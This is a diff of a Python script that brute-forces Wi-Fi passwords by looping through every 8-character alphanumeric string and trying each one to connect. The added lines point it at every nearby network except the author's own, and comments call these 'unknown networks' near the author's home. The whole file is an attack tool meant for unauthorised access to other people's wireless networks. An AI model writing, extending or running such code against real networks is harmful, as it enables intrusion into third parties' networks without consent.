@@ -1,42 +1,63 @@
 from config import *
 import time
 
+'''
+    Python version: 3.8.3
+    By: Agostinho Pina Ramos
+'''
 
 def searchWIFI(ssid):
-    arr = [
+    chars = [
         "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z",
         "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z",
         "0", "1", "2", "3", "4", "5", "6", "7", "8", "9"
     ]
-    bigArray = []
-    for d1 in arr:
-        for d2 in arr:
-            for d3 in arr:
-                for d4 in arr:
-                    for d5 in arr:
-                        for d6 in arr:
-                            for d7 in arr:
-                                for d8 in arr:
-                                    pasw = d1+d2+d3+d4+d5+d6+d7+d8
+    bigcharsay = []
+
+    start_time = time.time()
+    for d1 in chars:
+        for d2 in chars:
+            for d3 in chars:
+                for d4 in chars:
+                    for d5 in chars:
+                        for d6 in chars:
+                            for d7 in chars:
+                                for d8 in chars:
+                                    pasw = d1+d2+d3+d4+d5+d6+d7+d8 #The password length is 8
                                     print(ssid + ' : ' + pasw)
                                     if mkSense(pasw):
+                                        '''
+                                        Accepts one repetition a maximum of three times
+                                        Ex: AAA36274
+                                        In this case the maximum that the letter 'A' can repeat is 
+                                        three times.
+                                        '''
                                         setWIFI(ssid, pasw)
                                         time.sleep(5)
                                         if is_connected():
                                             print('>>>> ' + SSIDPASS(ssid))
-                                            print('\nDone!')
+                                            print('\nDone!\n')
+                                            print("--- %s seconds ---" % (round(time.time() - start_time,3)))
                                             return 0
                                     else:
-                                        bigArray.append(pasw)
-    for pasw in bigArray:
+                                        bigcharsay.append(pasw)
+    '''
+    If it ends without finding, the algorithm tries again 
+    with previously negated repetitive characters. It will take longer.
+    '''
+    for pasw in bigcharsay:
         print(f'# {ssid}' + ' : ' + pasw)
         setWIFI(ssid, pasw)
         time.sleep(5)
         if is_connected():
             print('>>>> ' + SSIDPASS(ssid))
-            print('\nDone!')
+            print('\nDone!\n')
+            print("--- %s seconds ---" % (round(time.time() - start_time,3)))
             return 0
 
-search = ARRSSID()
+search = ARRSSID() #All networks near my home
+myNetwork = 'MYWIFI' #Put here the network that you already know the password
+
 for ssid in search:
-    searchWIFI(ssid)
+    if myNetwork != ssid: #Accepts only unknown networks
+        searchWIFI(ssid)
